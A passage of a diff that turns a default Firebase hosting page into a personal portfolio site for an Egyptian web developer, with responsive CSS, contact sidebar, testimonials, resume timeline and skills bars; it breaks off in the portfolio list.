+.testimonials-avatar-box img { width: 80px; }
+
+.testimonials-item-title {
+  margin-bottom: 10px;
+  margin-left: 95px;
+}
+
+.testimonials-text {
+  line-clamp: 2;
+  -webkit-line-clamp: 2;
+}
+
+/* testimonials modal */
+
+.modal-container { padding: 20px; }
+
+.testimonials-modal {
+  display: flex;
+  justify-content: flex-start;
+  align-items: stretch;
+  gap: 25px;
+  padding: 30px;
+  border-radius: 20px;
+}
+
+.modal-img-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.modal-avatar-box {
+  border-radius: 18px;
+  margin-bottom: 0;
+}
+
+.modal-avatar-box img { width: 65px; }
+
+.modal-img-wrapper > img {
+  display: block;
+  flex-grow: 1;
+  width: 35px;
+}
+
+/* clients */
+
+.clients-list {
+  gap: 50px;
+  margin: 0 -30px;
+  padding: 45px;
+  scroll-padding-inline: 45px;
+}
+
+.clients-item { min-width: calc(33.33% - 35px); }
+
+
+
+/**
+ * #RESUME
+ */
+
+.timeline-list { margin-left: 65px; }
+
+.timeline-item:not(:last-child)::before { left: -40px; }
+
+.timeline-item::after {
+  height: 8px;
+  width: 8px;
+  left: -43px;
+}
+
+.skills-item:not(:last-child) { margin-bottom: 25px; }
+
+
+
+/**
+ * #PORTFOLIO, BLOG
+ */
+
+.project-img, .blog-banner-box { border-radius: 16px; }
+
+.blog-posts-list { gap: 30px; }
+
+.blog-content { padding: 25px; }
+
+
+
+/**
+ * #CONTACT
+ */
+
+.mapbox {
+  height: 380px;
+  border-radius: 18px;
+}
+
+.input-wrapper {
+  gap: 30px;
+  margin-bottom: 30px;
+}
+
+.form-input { padding: 15px 20px; }
+
+textarea.form-input { margin-bottom: 30px; }
+
+.form-btn {
+  --fs-6: 16px;
+  padding: 16px 20px;
+}
+
+.form-btn ion-icon { font-size: 18px; }
+
+}
+
+
+
+
+
+/**
+* responsive larger than 768px screen
+*/
+
+@media (min-width: 768px) {
+
+/**
+ * REUSED STYLE
+ */
+
+.sidebar, article { width: 700px; }
+
+.has-scrollbar::-webkit-scrollbar-button { width: 100px; }
+
+
+
+/**
+ * SIDEBAR
+ */
+
+.contacts-list {
+  grid-template-columns: 1fr 1fr;
+  gap: 30px 15px;
+}
+
+
+
+/**
+ * NAVBAR
+ */
+
+.navbar-link { --fs-8: 15px; }
+
+
+
+/**
+ * ABOUT
+ */
+
+/* testimonials modal */
+
+.testimonials-modal {
+  gap: 35px;
+  max-width: 680px;
+}
+
+.modal-avatar-box img { width: 80px; }
+
+
+
+/**
+ * PORTFOLIO
+ */
+
+.article-title { padding-bottom: 20px; }
+
+.filter-select-box { display: none; }
+
+.filter-list {
+  display: flex;
+  justify-content: flex-start;
+  align-items: center;
+  gap: 25px;
+  padding-left: 5px;
+  margin-bottom: 30px;
+}
+
+.filter-item button {
+  color: var(--light-gray);
+  font-size: var(--fs-5);
+  transition: var(--transition-1);
+}
+
+.filter-item button:hover { color: var(--light-gray-70); }
+
+.filter-item button.active { color: var(--orange-yellow-crayola); }
+
+/* portfolio and blog grid */
+
+.project-list, .blog-posts-list { grid-template-columns: 1fr 1fr; }
+
+
+
+/**
+ * CONTACT
+ */
+
+.input-wrapper { grid-template-columns: 1fr 1fr; }
+
+.form-btn {
+  width: max-content;
+  margin-left: auto;
+}
+
+}
+
+
+
+
+
+/**
+* responsive larger than 1024px screen
+*/
+
+@media (min-width: 1024px) {
+
+/**
+ * CUSTOM PROPERTY
+ */
+
+:root {
+
+  /**
+  * shadow
+  */
+
+  --shadow-1: -4px 8px 24px hsla(0, 0%, 0%, 0.125);
+  --shadow-2: 0 16px 30px hsla(0, 0%, 0%, 0.125);
+  --shadow-3: 0 16px 40px hsla(0, 0%, 0%, 0.125);
+
+}
+
+
+
+/**
+ * REUSED STYLE
+ */
+
+.sidebar, article {
+  width: 950px;
+  box-shadow: var(--shadow-5);
+}
+
+
+
+/**
+ * MAIN 
+ */
+
+main { margin-bottom: 60px; }
+
+.main-content {
+  position: relative;
+  width: max-content;
+  margin: auto;
+}
+
+
+
+/**
+ * NAVBAR
+ */
+
+.navbar {
+  position: absolute;
+  bottom: auto;
+  top: 0;
+  left: auto;
+  right: 0;
+  width: max-content;
+  border-radius: 0 20px;
+  padding: 0 20px;
+  box-shadow: none;
+}
+
+.navbar-list {
+  gap: 30px;
+  padding: 0 20px;
+}
+
+.navbar-link { font-weight: var(--fw-500); }
+
+
+
+/**
+ * ABOUT
+ */
+
+/* service */
+
+.service-list {
+  grid-template-columns: 1fr 1fr;
+  gap: 20px 25px;
+}
+
+/* testimonials */
+
+.testimonials-item { min-width: calc(50% - 15px); }
+
+/* clients */
+
+.clients-item { min-width: calc(25% - 38px); }
+
+
+
+/**
+ * PORTFOLIO
+ */
+
+.project-list { grid-template-columns: repeat(3, 1fr); }
+
+
+
+/**
+ * BLOG
+ */
+
+.blog-banner-box { height: 230px; }
+
+}
+
+
+
+
+
+/**
+* responsive larger than 1250px screen
+*/
+
+@media (min-width: 1250px) {
+
+/**
+ * RESET
+ */
+
+body::-webkit-scrollbar { width: 20px; }
+
+body::-webkit-scrollbar-track { background: var(--smoky-black); }
+
+body::-webkit-scrollbar-thumb {
+  border: 5px solid var(--smoky-black);
+  background: hsla(0, 0%, 100%, 0.1);
+  border-radius: 20px;
+  box-shadow: inset 1px 1px 0 hsla(0, 0%, 100%, 0.11),
+              inset -1px -1px 0 hsla(0, 0%, 100%, 0.11);
+}
+
+body::-webkit-scrollbar-thumb:hover { background: hsla(0, 0%, 100%, 0.15); }
+
+body::-webkit-scrollbar-button { height: 60px; }
+
+
+
+/**
+ * REUSED STYLE
+ */
+
+.sidebar, article { width: auto; }
+
+article { min-height: 100%; }
+
+
+
+/**
+ * MAIN
+ */
+
+main {
+  max-width: 1200px;
+  margin-inline: auto;
+  display: flex;
+  justify-content: center;
+  align-items: stretch;
+  gap: 25px;
+}
+
+.main-content {
+  min-width: 75%;
+  width: 75%;
+  margin: 0;
+}
+
+
+
+/**
+ * SIDEBAR
+ */
+
+.sidebar {
+  position: sticky;
+  top: 60px;
+  max-height: max-content;
+  height: 100%;
+  margin-bottom: 0;
+  padding-top: 60px;
+  z-index: 1;
+}
+
+.sidebar-info { flex-direction: column; }
+
+.avatar-box img { width: 150px; }
+
+.info-content .name {
+  white-space: nowrap;
+  text-align: center;
+}
+
+.info-content .title { margin: auto; }
+
+.info_more-btn { display: none; }
+
+.sidebar-info_more {
+  opacity: 1;
+  visibility: visible;
+}
+
+.contacts-list { grid-template-columns: 1fr; }
+
+.contact-info :is(.contact-link) {
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.contact-info :is(.contact-link, time, address) {
+  --fs-7: 14px;
+  font-weight: var(--fw-300);
+}
+
+.separator:last-of-type {
+  margin: 15px 0;
+  opacity: 0;
+}
+
+.social-list { justify-content: center; }
+
+
+
+/**
+ * RESUME
+ */
+
+.timeline-text { max-width: 700px; }
+
+}
+</style>
+
+  <!--
+    - google font link
+  -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+</head>
+
+<body>
+<!-- Floating WhatsApp Button -->
+<a href="https://wa.me/+201090183430" class="whatsapp-float" target="_blank">
+  <!-- WhatsApp SVG Logo -->
+  <svg class="whatsapp-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50">
+    <path d="M 25 2 C 12.309534 2 2 12.309534 2 25 C 2 29.079097 3.1186875 32.88588 4.984375 36.208984 L 2.0371094 46.730469 A 1.0001 1.0001 0 0 0 3.2402344 47.970703 L 14.210938 45.251953 C 17.434629 46.972929 21.092591 48 25 48 C 37.690466 48 48 37.690466 48 25 C 48 12.309534 37.690466 2 25 2 z M 25 4 C 36.609534 4 46 13.390466 46 25 C 46 36.609534 36.609534 46 25 46 C 21.278025 46 17.792121 45.029635 14.761719 43.333984 A 1.0001 1.0001 0 0 0 14.033203 43.236328 L 4.4257812 45.617188 L 7.0019531 36.425781 A 1.0001 1.0001 0 0 0 6.9023438 35.646484 C 5.0606869 32.523592 4 28.890107 4 25 C 4 13.390466 13.390466 4 25 4 z M 16.642578 13 C 16.001539 13 15.086045 13.23849 14.333984 14.048828 C 13.882268 14.535548 12 16.369511 12 19.59375 C 12 22.955271 14.331391 25.855848 14.613281 26.228516 L 14.615234 26.228516 L 14.615234 26.230469 C 14.588494 26.195329 14.973031 26.752191 15.486328 27.419922 C 15.999626 28.087653 16.717405 28.96464 17.619141 29.914062 C 19.422612 31.812909 21.958282 34.007419 25.105469 35.349609 C 26.554789 35.966779 27.698179 36.339417 28.564453 36.611328 C 30.169845 37.115426 31.632073 37.038799 32.730469 36.876953 C 33.55263 36.755876 34.456878 36.361114 35.351562 35.794922 C 36.246248 35.22873 37.12309 34.524722 37.509766 33.455078 C 37.786772 32.688244 37.927591 31.979598 37.978516 31.396484 C 38.003976 31.104927 38.007211 30.847602 37.988281 30.609375 C 37.969311 30.371148 37.989581 30.188664 37.767578 29.824219 C 37.302009 29.059804 36.774753 29.039853 36.224609 28.767578 C 35.918939 28.616297 35.048661 28.191329 34.175781 27.775391 C 33.303883 27.35992 32.54892 26.991953 32.083984 26.826172 C 31.790239 26.720488 31.431556 26.568352 30.914062 26.626953 C 30.396569 26.685553 29.88546 27.058933 29.587891 27.5 C 29.305837 27.918069 28.170387 29.258349 27.824219 29.652344 C 27.819619 29.649544 27.849659 29.663383 27.712891 29.595703 C 27.284761 29.383815 26.761157 29.203652 25.986328 28.794922 C 25.2115 28.386192 24.242255 27.782635 23.181641 26.847656 L 23.181641 26.845703 C 21.603029 25.455949 20.497272 23.711106 20.148438 23.125 C 20.171937 23.09704 20.145643 23.130901 20.195312 23.082031 L 20.197266 23.080078 C 20.553781 22.728924 20.869739 22.309521 21.136719 22.001953 C 21.515257 21.565866 21.68231 21.181437 21.863281 20.822266 C 22.223954 20.10644 22.02313 19.318742 21.814453 18.904297 L 21.814453 18.902344 C 21.828863 18.931014 21.701572 18.650157 21.564453 18.326172 C 21.426943 18.001263 21.251663 17.580039 21.064453 17.130859 C 20.690033 16.232501 20.272027 15.224912 20.023438 14.634766 L 20.023438 14.632812 C 19.730591 13.937684 19.334395 13.436908 18.816406 13.195312 C 18.298417 12.953717 17.840778 13.022402 17.822266 13.021484 L 17.820312 13.021484 C 17.450668 13.004432 17.045038 13 16.642578 13 z M 16.642578 15 C 17.028118 15 17.408214 15.004701 17.726562 15.019531 C 18.054056 15.035851 18.033687 15.037192 17.970703 15.007812 C 17.906713 14.977972 17.993533 14.968282 18.179688 15.410156 C 18.423098 15.98801 18.84317 16.999249 19.21875 17.900391 C 19.40654 18.350961 19.582292 18.773816 19.722656 19.105469 C 19.863021 19.437122 19.939077 19.622295 20.027344 19.798828 L 20.027344 19.800781 L 20.029297 19.802734 C 20.115837 19.973483 20.108185 19.864164 20.078125 19.923828 C 19.867096 20.342656 19.838461 20.445493 19.625 20.691406 C 19.29998 21.065838 18.968453 21.483404 18.792969 21.65625 C 18.639439 21.80707 18.36242 22.042032 18.189453 22.501953 C 18.016221 22.962578 18.097073 23.59457 18.375 24.066406 C 18.745032 24.6946 19.964406 26.679307 21.859375 28.347656 C 23.05276 29.399678 24.164563 30.095933 25.052734 30.564453 C 25.940906 31.032973 26.664301 31.306607 26.826172 31.386719 C 27.210549 31.576953 27.630655 31.72467 28.119141 31.666016 C 28.607627 31.607366 29.02878 31.310979 29.296875 31.007812 L 29.298828 31.005859 C 29.655629 30.601347 30.715848 29.390728 31.224609 28.644531 C 31.246169 28.652131 31.239109 28.646231 31.408203 28.707031 L 31.408203 28.708984 L 31.410156 28.708984 C 31.487356 28.736474 32.454286 29.169267 33.316406 29.580078 C 34.178526 29.990889 35.053561 30.417875 35.337891 30.558594 C 35.748225 30.761674 35.942113 30.893881 35.992188 30.894531 C 35.995572 30.982516 35.998992 31.07786 35.986328 31.222656 C 35.951258 31.624292 35.8439 32.180225 35.628906 32.775391 C 35.523582 33.066746 34.975018 33.667661 34.283203 34.105469 C 33.591388 34.543277 32.749338 34.852514 32.4375 34.898438 C 31.499896 35.036591 30.386672 35.087027 29.164062 34.703125 C 28.316336 34.437036 27.259305 34.092596 25.890625 33.509766 C 23.114812 32.325956 20.755591 30.311513 19.070312 28.537109 C 18.227674 27.649908 17.552562 26.824019 17.072266 26.199219 C 16.592866 25.575584 16.383528 25.251054 16.208984 25.021484 L 16.207031 25.019531 C 15.897202 24.609805 14 21.970851 14 19.59375 C 14 17.077989 15.168497 16.091436 15.800781 15.410156 C 16.132721 15.052495 16.495617 15 16.642578 15 z"></path>
+  </svg>
+  <span>Chat with Us</span>
+</a>
+
+  <main>
+
+  
+
+    <aside class="sidebar" data-sidebar>
+
+      <div class="sidebar-info">
+
+        <figure class="avatar-box">
+          <img src="https://ashraf-dess.web.app/assets/images/my-avatar.png" alt="Ashraf Sobhi" width="80">
+        </figure>
+
+        <div class="info-content">
+          <h1 class="name" title="Ashraf Sobhi">Ashraf Sobhi</h1>
+
+          <p class="title">Web developer</p>
+        </div>
+
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Contacts</span>
+
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+
+      </div>
+
+      <div class="sidebar-info_more">
+
+        <div class="separator"></div>
+
+        <ul class="contacts-list">
+
+          <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+
+              <a href="mailto:ashraf@onionmail.com" class="contact-link">ashraf@onionmail.com</a>
+            </div>
+
+          </li>
+
+          <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="phone-portrait-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Phone</p>
+
+              <a href="tel:+201090183430" class="contact-link">+20 (109) 018-3430</a>
+            </div>
+
+          <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="calendar-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Instagram</p>
+
+             <a href="https://www.instagram.com/ashraf_dess/" class="contact-link">ashraf-dess</a>
+            </div>
+
+          </li>
+
+          <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="location-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Location</p>
+
+              <address>Sadat City, Minufia, EG</address>
+            </div>
+
+          </li>
+
+        </ul>
+
+        <div class="separator"></div>
+
+        <ul class="social-list">
+
+          <li class="social-item">
+            <a href="https://www.facebook.com/ashrafsobhi81" class="social-link">
+              <ion-icon name="logo-facebook"></ion-icon>
+            </a>
+          </li>
+
+          <li class="social-item">
+            <a href="https://wa.me/201090183430" class="social-link">
+              <ion-icon name="logo-whatsapp"></ion-icon>
+            </a>
+          </li>
+
+          <li class="social-item">
+            <a href="https://www.instagram.com/ashraf_dess/" class="social-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+        </ul>
+
+      </div>
+
+    </aside>
+
+
+
+
+
+    <!--
+      - #main-content
     -->
-    <script defer src="/__/firebase/init.js?useEmulator=true"></script>
 
-    <style media="screen">
-      body { background: #ECEFF1; color: rgba(0,0,0,0.87); font-family: Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-      #message { background: white; max-width: 360px; margin: 100px auto 16px; padding: 32px 24px; border-radius: 3px; }
-      #message h2 { color: #ffa100; font-weight: bold; font-size: 16px; margin: 0 0 8px; }
-      #message h1 { font-size: 22px; font-weight: 300; color: rgba(0,0,0,0.6); margin: 0 0 16px;}
-      #message p { line-height: 140%; margin: 16px 0 24px; font-size: 14px; }
-      #message a { display: block; text-align: center; background: #039be5; text-transform: uppercase; text-decoration: none; color: white; padding: 16px; border-radius: 4px; }
-      #message, #message a { box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); }
-      #load { color: rgba(0,0,0,0.4); text-align: center; font-size: 13px; }
-      @media (max-width: 600px) {
-        body, #message { margin-top: 0; background: white; box-shadow: none; }
-        body { border-top: 16px solid #ffa100; }
+    <div class="main-content">
+
+      <!--
+        - #NAVBAR
+      -->
+
+      <nav class="navbar">
+
+        <ul class="navbar-list">
+
+          <li class="navbar-item">
+            <button class="navbar-link  active" data-nav-link>About</button>
+          </li>
+
+          <li class="navbar-item">
+            <button class="navbar-link" data-nav-link>Resume</button>
+          </li>
+
+          <li class="navbar-item">
+            <button class="navbar-link" data-nav-link>Portfolio</button>
+          </li>
+
+          <li class="navbar-item">
+            <button class="navbar-link" data-nav-link>Order</button>
+          </li>
+
+          <li class="navbar-item">
+            <button class="navbar-link" data-nav-link>Contact</button>
+          </li>
+
+        </ul>
+
+      </nav>
+
+
+
+
+
+      <!--
+        - #ABOUT
+      -->
+
+      <article class="about  active" data-page="about">
+
+        <header>
+          <h2 class="h2 article-title">About me</h2>
+        </header>
+
+        <section class="about-text">
+          <p>
+            I'm Creative Director and UI/UX Designer from Sadat City,Egypt, working in web development and print media.
+            I enjoy
+            turning complex problems into simple, beautiful and intuitive designs.
+          </p>
+
+          <p>
+            My job is to build your website so that it is functional and user-friendly but at the same time attractive.
+            Moreover, I
+            add personal touch to your product and make sure that is eye-catching and easy to use. My aim is to bring
+            across your
+            message and identity in the most creative way. I created web design for many famous brand companies.
+          </p>
+        </section>
+
+
+        <!--
+          - service
+        -->
+
+        <section class="service">
+
+          <h3 class="h3 service-title">What i'm doing</h3>
+
+          <ul class="service-list">
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://ashraf-dess.web.app/assets/images/icon-design.svg
+                " alt="design icon" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">Web design</h4>
+
+                <p class="service-item-text">
+                  The most modern and high-quality design made at a professional level.
+                </p>
+              </div>
+
+            </li>
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://ashraf-dess.web.app/assets/images/icon-dev.svg" alt="Web development icon" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">Web development</h4>
+
+                <p class="service-item-text">
+                  High-quality development of sites at the professional level.
+                </p>
+              </div>
+
+            </li>
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://ashraf-dess.web.app/assets/images/icon-app.svg" alt="mobile app icon" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">Mobile apps</h4>
+
+                <p class="service-item-text">
+                  Professional development of applications for iOS and Android.
+                </p>
+              </div>
+
+            </li>
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://ashraf-dess.web.app/assets/images/icon-photo.svg" alt="camera icon" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">Photography</h4>
+
+                <p class="service-item-text">
+                  I make high-quality photos of any category at a professional level.
+                </p>
+              </div>
+
+            </li>
+
+          </ul>
+
+        </section>
+
+
+        <!--
+          - testimonials
+        -->
+
+        <section class="testimonials">
+
+          <h3 class="h3 testimonials-title">Testimonials</h3>
+
+          <ul class="testimonials-list has-scrollbar">
+
+            <li class="testimonials-item">
+              <div class="content-card" data-testimonials-item>
+
+                <figure class="testimonials-avatar-box">
+                  <img src="https://ashraf-dess.web.app/assets/images/avatar-1.png" alt="Daniel lewis" width="60" data-testimonials-avatar>
+                </figure>
+
+                <h4 class="h4 testimonials-item-title" data-testimonials-title>Daniel lewis</h4>
+
+                <div class="testimonials-text" data-testimonials-text>
+                  <p>
+                    Ashraf was a pleasure to work with. He was incredibly responsive to our questions and concerns, and always kept us in the loop throughout the development process. His communication skills are top-notch!" - Maria Garcia, Marketing Manager, GreenLeaf Organics
+                  </p>
+                </div>
+
+              </div>
+            </li>
+
+            <li class="testimonials-item">
+              <div class="content-card" data-testimonials-item>
+
+                <figure class="testimonials-avatar-box">
+                  <img src="https://ashraf-dess.web.app/assets/images/avatar-2.png" alt="Jessica miller" width="60" data-testimonials-avatar>
+                </figure>
+
+                <h4 class="h4 testimonials-item-title" data-testimonials-title>Jessica miller</h4>
+
+                <div class="testimonials-text" data-testimonials-text>
+                  <p>
+                    "I can't recommend Ashraf highly enough! He was so enthusiastic about our project and brought a level of energy and passion that was contagious. We're thrilled with the website he built for us!" - Owner of The Cozy Cafe
+                  </p>
+                </div>
+
+              </div>
+            </li>
+
+            <li class="testimonials-item">
+              <div class="content-card" data-testimonials-item>
+
+                <figure class="testimonials-avatar-box">
+                  <img src="https://ashraf-dess.web.app/assets/images/avatar-3.png" alt="Emily evans" width="60" data-testimonials-avatar>
+                </figure>
+
+                <h4 class="h4 testimonials-item-title" data-testimonials-title>Emily evans</h4>
+
+                <div class="testimonials-text" data-testimonials-text>
+                  <p>
+                    Ashraf was hired to create a corporate identity. We were very pleased with the work done. She has a
+                    lot of experience
+                    and is very concerned about the needs of client. Lorem ipsum dolor sit amet, ullamcous cididt
+                    consectetur adipiscing
+                    elit, seds do et eiusmod tempor incididunt ut laborels dolore magnarels alia.
+                  </p>
+                </div>
+
+              </div>
+            </li>
+
+            <li class="testimonials-item">
+              <div class="content-card" data-testimonials-item>
+
+                <figure class="testimonials-avatar-box">
+                  <img src="https://ashraf-dess.web.app/assets/images/avatar-4.png" alt="Henry william" width="60" data-testimonials-avatar>
+                </figure>
+
+                <h4 class="h4 testimonials-item-title" data-testimonials-title>Henry william</h4>
+
+                <div class="testimonials-text" data-testimonials-text>
+                  <p>
+                    Working with Ashraf was a fantastic experience. He was able to take our vague ideas and turn them into a beautiful and functional website. He was communicative throughout the process, met deadlines, and was always willing to go the extra mile. I wouldn't hesitate to hire him again." -Henry william , Owner of Happy Paws Pet Supplies
+                  </p>
+                </div>
+
+              </div>
+            </li>
+
+          </ul>
+
+        </section>
+
+
+        <!--
+          - testimonials modal
+        -->
+
+        <div class="modal-container" data-modal-container>
+
+          <div class="overlay" data-overlay></div>
+
+          <section class="testimonials-modal">
+
+            <button class="modal-close-btn" data-modal-close-btn>
+              <ion-icon name="close-outline"></ion-icon>
+            </button>
+
+            <div class="modal-img-wrapper">
+              <figure class="modal-avatar-box">
+                <img src="https://ashraf-dess.web.app/assets/images/avatar-1.png" alt="Daniel lewis" width="80" data-modal-img>
+              </figure>
+
+              <img src="https://ashraf-dess.web.app/assets/images/icon-quote.svg" alt="quote icon">
+            </div>
+
+            <div class="modal-content">
+
+              <h4 class="h3 modal-title" data-modal-title>David Lee</h4>
+
+              <time datetime="2021-06-14">14 June, 2021</time>
+
+              <div data-modal-text>
+                <p>
+                  Ashraf's expertise in React was invaluable to our project. He was able to quickly troubleshoot issues and implement complex features. His code is clean, well-documented, and easy to maintain. We're extremely happy with the results." - David Lee, CTO of Tech Solutions
+                </p>
+              </div>
+
+            </div>
+
+          </section>
+
+        </div>
+
+
+        <!--
+          - clients
+        -->
+
+        <section class="clients">
+
+          <h3 class="h3 clients-title">Clients</h3>
+
+          <ul class="clients-list has-scrollbar">
+
+            <li class="clients-item">
+              <a href="#">
+                <img src="https://ashraf-dess.web.app/assets/images/logo-1-color.png" alt="client logo">
+              </a>
+            </li>
+
+            <li class="clients-item">
+              <a href="#">
+                <img src="https://ashraf-dess.web.app/assets/images/logo-2-color.png" alt="client logo">
+              </a>
+            </li>
+
+            <li class="clients-item">
+              <a href="#">
+                <img src="https://ashraf-dess.web.app/assets/images/logo-3-color.png" alt="client logo">
+              </a>
+            </li>
+
+            <li class="clients-item">
+              <a href="#">
+                <img src="https://ashraf-dess.web.app/assets/images/logo-4-color.png" alt="client logo">
+              </a>
+            </li>
+
+            <li class="clients-item">
+              <a href="#">
+                <img src="https://ashraf-dess.web.app/assets/images/logo-5-color.png" alt="client logo">
+              </a>
+            </li>
+
+            <li class="clients-item">
+              <a href="#">
+                <img src="https://ashraf-dess.web.app/assets/images/logo-6-color.png" alt="client logo">
+              </a>
+            </li>
+
+          </ul>
+
+        </section>
+
+      </article>
+
+
+
+
+
+      <!--
+        - #RESUME
+      -->
+
+      <article class="resume" data-page="resume">
+
+        <header>
+          <h2 class="h2 article-title">Resume</h2>
+        </header>
+
+        <section class="timeline">
+
+          <div class="title-wrapper">
+            <div class="icon-box">
+              <ion-icon name="book-outline"></ion-icon>
+            </div>
+
+            <h3 class="h3">Education</h3>
+          </div>
+
+          <ol class="timeline-list">
+
+            <li class="timeline-item">
+
+              <h4 class="h4 timeline-item-title">Misr University for Science and Technology (MUST)</h4>
+
+              <span>2017 — 2018</span>
+
+              <p class="timeline-text">
+                Nemo enims ipsam voluptatem, blanditiis praesentium voluptum delenit atque corrupti, quos dolores et
+                quas molestias
+                exceptur.
+              </p>
+
+            </li>
+
+            <li class="timeline-item">
+
+              <h4 class="h4 timeline-item-title">Future academy of art</h4>
+
+              <span>2016 — 2017</span>
+
+              <p class="timeline-text">
+                Ratione voluptatem sequi nesciunt, facere quisquams facere menda ossimus, omnis voluptas assumenda est
+                omnis..
+              </p>
+
+            </li>
+
+            <li class="timeline-item">
+
+              <h4 class="h4 timeline-item-title">High school Future</h4>
+
+              <span>2012 — 2014</span>
+
+              <p class="timeline-text">
+                Duis aute irure dolor in reprehenderit in voluptate, quila voluptas mag odit aut fugit, sed consequuntur
+                magni dolores
+                eos.
+              </p>
+
+            </li>
+
+          </ol>
+
+        </section>
+
+        <section class="timeline">
+
+          <div class="title-wrapper">
+            <div class="icon-box">
+              <ion-icon name="book-outline"></ion-icon>
+            </div>
+
+            <h3 class="h3">Experience</h3>
+          </div>
+
+          <ol class="timeline-list">
+
+            <li class="timeline-item">
+
+              <h4 class="h4 timeline-item-title">Creative director</h4>
+
+              <span>2023 — Present</span>
+
+              <p class="timeline-text">
+                A Creative Director leads the creative vision for projects, products, or brands. They oversee a team of creatives (designers, writers, etc.) to ensure a cohesive and impactful final product.  They're responsible for brainstorming ideas, developing concepts, and presenting work to clients.  
+
+Think of them as the captain of the creative ship, steering everyone towards a shared vision. 🚢
+.
+              </p>
+
+            </li>
+
+            <li class="timeline-item">
+
+              <h4 class="h4 timeline-item-title">Art director</h4>
+
+              <span>2020 — 2023</span>
+
+              <p class="timeline-text">
+                Art directors are like visual conductors. They bring together the work of designers, illustrators, and photographers to create a unified and impactful look for things like magazines, movies, or ad campaigns. They're the ones who decide on the colors, the fonts, the overall style—everything you *see* is shaped by their vision.
+.
+              </p>
+
+            </li>
+
+            <li class="timeline-item">
+
+              <h4 class="h4 timeline-item-title">Web designer</h4>
+
+              <span>2017 — 2020</span>
+
+              <p class="timeline-text">
+                Web designers are the architects of the internet. They create the look and feel of websites, making sure they're both beautiful and easy to use. They blend creativity and technical skills to craft engaging online experiences.
+
+**Think of them as digital interior designers:**
+
+* **Planning:**  They map out the website's structure.
+* **Styling:** They choose colors, fonts, and images.
+* **User-friendliness:** They make sure the website is easy to navigate.
+
+**They use tools like:**
+
+* Photoshop
+* Figma
+* Sketch
+
+**They often work with:**
+
+* Web developers (who bring the designs to life with code)
+* Content writers (who provide the text)
+
+**Ultimately, web designers make the internet a prettier and more user-friendly place.** 
+.
+              </p>
+
+            </li>
+
+          </ol>
+
+        </section>
+
+        <section class="skill">
+
+          <h3 class="h3 skills-title">My skills</h3>
+
+          <ul class="skills-list content-card">
+
+            <li class="skills-item">
+
+              <div class="title-wrapper">
+                <h5 class="h5">Web design</h5>
+                <data value="80">80%</data>
+              </div>
+
+              <div class="skill-progress-bg">
+                <div class="skill-progress-fill" style="width: 80%;"></div>
+              </div>
+
+            </li>
+
+            <li class="skills-item">
+
+              <div class="title-wrapper">
+                <h5 class="h5">Graphic design</h5>
+                <data value="70">70%</data>
+              </div>
+
+              <div class="skill-progress-bg">
+                <div class="skill-progress-fill" style="width: 70%;"></div>
+              </div>
+
+            </li>
+
+            <li class="skills-item">
+
+              <div class="title-wrapper">
+                <h5 class="h5">Branding</h5>
+                <data value="90">90%</data>
+              </div>
+
+              <div class="skill-progress-bg">
+                <div class="skill-progress-fill" style="width: 90%;"></div>
+              </div>
+
+            </li>
+
+            <li class="skills-item">
+
+              <div class="title-wrapper">
+                <h5 class="h5">WordPress</h5>
+                <data value="50">50%</data>
+              </div>
+
+              <div class="skill-progress-bg">
+                <div class="skill-progress-fill" style="width: 50%;"></div>
+              </div>
+
+            </li>
+
+          </ul>
+
+        </section>
+
+      </article>
+
+
+
+
+
+      <!--
+        - #PORTFOLIO
+      -->
+
+      <article class="portfolio" data-page="portfolio">
+
+        <header>
+          <h2 class="h2 article-title">Portfolio</h2>
+        </header>
+
+        <section class="projects">
+
+          <ul class="filter-list">
+
+            <li class="filter-item">
+              <button class="active" data-filter-btn>All</button>
+            </li>
+
+            <li class="filter-item">
+              <button data-filter-btn>Web design</button>
+            </li>
+
+            <li class="filter-item">
+              <button data-filter-btn>Applications</button>
+            </li>
+
+            <li class="filter-item">
+              <button data-filter-btn>Web development</button>
+            </li>
+
+          </ul>
+
+          <div class="filter-select-box">
+
+            <button class="filter-select" data-select>
+
+              <div class="select-value" data-selecct-value>Select category</div>
+
+              <div class="select-icon">
+                <ion-icon name="chevron-down"></ion-icon>
+              </div>
+
+            </button>
+
+            <ul class="select-list">
+
+              <li class="select-item">
+                <button data-select-item>All</button>
+              </li>
+
+              <li class="select-item">
+                <button data-select-item>Web design</button>
+              </li>
+
+              <li class="select-item">
+                <button data-select-item>Applications</button>
+              </li>
+
+              <li class="select-item">
+                <button data-select-item>Web development</button>
+              </li>
+
+            </ul>
+
+          </div>
+
+          <ul class="project-list">
+
+            <li class="project-item  active" data-filter-item data-category="web development">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
